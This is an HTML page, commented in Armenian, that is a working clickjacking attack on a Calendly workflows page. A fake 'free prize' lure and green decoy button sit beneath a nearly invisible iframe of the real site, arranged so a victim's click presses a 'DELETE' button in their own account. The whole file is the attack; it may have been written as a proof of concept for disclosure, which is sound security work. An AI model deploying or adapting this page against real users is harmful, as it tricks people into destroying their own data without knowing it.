<!DOCTYPE html>
<html lang="hy">
<head>
    <meta charset="UTF-8">
    <title>Շնորհավորում ենք: Դուք շահել եք մրցանակ</title>
    <style>
        /* 1. Էջի ընդհանուր ձևավորումը (խաբկանք) */
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }

        .container {
            position: relative;
            width: 800px;
            height: 600px;
            margin: 0 auto;
        }

        /* 2. Հարձակվողի տեսանելի «տակի» կոճակը */
        .decoy-button {
            position: absolute;
            /* Դիրքավորվում է ճիշտ այնտեղ, որտեղ iframe-ի ներսում «DELETE» կոճակն է */
            top: 250px; 
            left: 300px;
            width: 200px;
            height: 50px;
            background-color: #28a745;
            color: white;
            font-size: 18px;
            font-weight: bold;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            z-index: 1; /* Գտնվում է iframe-ի տակ */
        }

        /* 3. Թիրախային կայքի անտեսանելի Iframe-ը */
        .victim-iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            /* ԿԱՐԵՎՈՐ. opacity: 0-ն iframe-ը դարձնում է լրիվ անտեսանելի, 
               բայց կլիկները շարունակում են գնալ դեպի iframe */
            opacity: 0.0001; 
            z-index: 2; /* Գտնվում է «խաբկանք» կոճակի վերևում */
        }
    </style>
</head>
<body>

    <h1>Սեղմեք կոճակը՝ ձեր անվճար մրցանակը ստանալու համար:</h1>

    <div class="container">
        <!-- Հարձակվողի տեսանելի կոճակը -->
        <button class="decoy-button">Ստանալ Մրցանակը</button>

        <!-- Calendly-ի անտեսանելի էջը iframe-ի ներսում -->
        <iframe 
            class="victim-iframe" 
            src="https://calendly.com/app/workflows/a92acd70-8191-490e-b402-cb8a010fa5af">
        </iframe>
    </div>

</body>
</html>
